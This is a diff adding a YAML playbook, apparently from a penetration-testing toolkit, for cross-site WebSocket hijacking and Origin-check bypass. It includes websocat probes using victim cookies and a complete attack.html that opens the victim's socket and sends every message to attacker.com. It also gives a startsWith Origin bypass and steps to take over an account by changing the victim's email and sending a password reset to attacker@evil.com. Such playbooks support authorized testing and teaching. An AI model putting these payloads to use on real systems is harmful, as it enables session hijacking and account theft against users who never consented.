@@ -1,0 +1,101 @@
+id: websocket-origin-bypass
+name: "Web — WebSocket cross-site hijacking (CSWSH) + origin bypass"
+description: >
+  WebSockets aren't subject to CORS — only the `Origin` header is checked
+  (if at all). If the server doesn't enforce origin OR uses a permissive
+  check, attacker site can open a WS connection riding the victim's
+  cookies → bidirectional access to their authenticated session.
+tags: [web, websocket, cswsh, origin-bypass, csrf]
+difficulty: medium
+
+inputs:
+  - name: ws_endpoint
+    description: "WebSocket URL (wss://target.com/ws)."
+    required: true
+
+steps:
+  - id: identify_ws
+    name: "Identify WebSocket endpoints"
+    inline_command: |
+      # In Burp/dev tools, watch for "ws://" or "wss://" connections.
+      # Open the WS in browser dev tools → look at Frames tab to see message
+      # shape (often JSON-RPC-like: {"id":1,"method":"...","params":...}).
+      # Also check JS source:
+      curl -s '<app>' | grep -oE 'wss?://[^"]+'
+
+  - id: origin_check_probe
+    name: "Test Origin header enforcement"
+    inline_command: |
+      # 1) Confirm normal connect works:
+      websocat '<ws>' --header 'Origin: https://target.com' --header 'Cookie: session=<victim_cookie>'
+      # 2) Try with attacker origin:
+      websocat '<ws>' --header 'Origin: https://attacker.com' --header 'Cookie: session=<victim_cookie>'
+      # 3) Try with no Origin (curl behavior):
+      websocat '<ws>' --header 'Cookie: session=<victim_cookie>'
+    inputs:
+      ws: "${ws_endpoint}"
+    notes: |
+      If #2 or #3 still receives messages — CSWSH viable. If only #1 works
+      → origin is enforced; look for less-strict variants (null origin,
+      subdomain prefix/suffix bypasses).
+
+  - id: craft_attack_page
+    name: "Craft attacker-hosted page that hijacks WS"
+    inline_command: |
+      cat > attack.html <<'EOF'
+      <html><body>
+      <script>
+        const ws = new WebSocket('<ws>');
+        ws.onopen = () => {
+          // Send any message the legit client would send:
+          ws.send(JSON.stringify({id:1, method:'getProfile'}));
+        };
+        ws.onmessage = (e) => {
+          // Exfil to attacker:
+          fetch('https://attacker.com/log?d=' + btoa(e.data));
+        };
+      </script>
+      </body></html>
+      EOF
+      # Host: python3 -m http.server 80
+      # Lure victim to it while they're logged in to <ws_host>.
+    inputs:
+      ws: "${ws_endpoint}"
+
+  - id: bypass_subdomain
+    name: "Subdomain bypass: 'https://target.com' substring matching"
+    inline_command: |
+      # If server checks Origin with startsWith('https://target.com') —
+      # any URL starting with that string passes:
+      #   https://target.com.attacker.com  →  passes the check
+      websocat '<ws>' --header 'Origin: https://target.com.attacker.com' --header 'Cookie: session=<cookie>'
+    inputs:
+      ws: "${ws_endpoint}"
+
+  - id: token_in_url_leak
+    name: "If WS auth is via URL token (?token=...) → Referer leak"
+    inline_command: |
+      # Many apps put bearer tokens in the WS URL itself; the URL ends up
+      # in window.location and leaks via Referer to any image/script on
+      # third-party domains.
+      # Bonus: WS upgrade fetch is GET — server logs the full URL with token.
+
+  - id: full_takeover
+    name: "Bidirectional control → take over the session"
+    inline_command: |
+      # From inside your attack.html, send the WS messages that:
+      # - retrieve the victim's profile
+      # - change their email
+      # - trigger a password reset to attacker@evil.com
+      # All of it rides the WS auth — same as logged-in user.
+
+references:
+  - title: "PortSwigger — WebSocket security"
+    url:   "https://portswigger.net/web-security/websockets"
+  - title: "HackTricks — WebSocket Attacks"
+    url:   "https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html"
+
+next_chains:
+  - chain: csrf-and-token-leak
+    when:   'WS used for state-changing actions'
+    reason: 'CSWSH is a CSRF variant — chain into broader CSRF audit.'
